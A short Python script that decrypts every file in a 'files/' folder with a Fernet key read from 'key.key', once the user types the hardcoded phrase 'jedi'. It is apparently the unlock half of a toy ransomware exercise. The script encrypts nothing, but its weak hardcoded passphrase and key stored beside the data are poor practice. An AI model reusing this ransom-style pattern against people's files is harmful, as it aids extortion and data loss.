import os
from cryptography.fernet import Fernet
from helpers.file_helper import FileHelper

base_file_directory = "files/"

fileHelper = FileHelper()

# Find the files
files = fileHelper.get_files()

# Get key to decrypt
secretkey = fileHelper.get_file_content("key.key")

secretphrase = "jedi"

user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
    # Decrypt file
    for file in files:

        contents = fileHelper.get_file_content(base_file_directory + file)

        decrypted_contents = Fernet(secretkey).decrypt(contents)

        fileHelper.set_file_content(base_file_directory + file, decrypted_contents)

        print("Your files are decrypted")
else:
    print("Sorry wrong phrase")
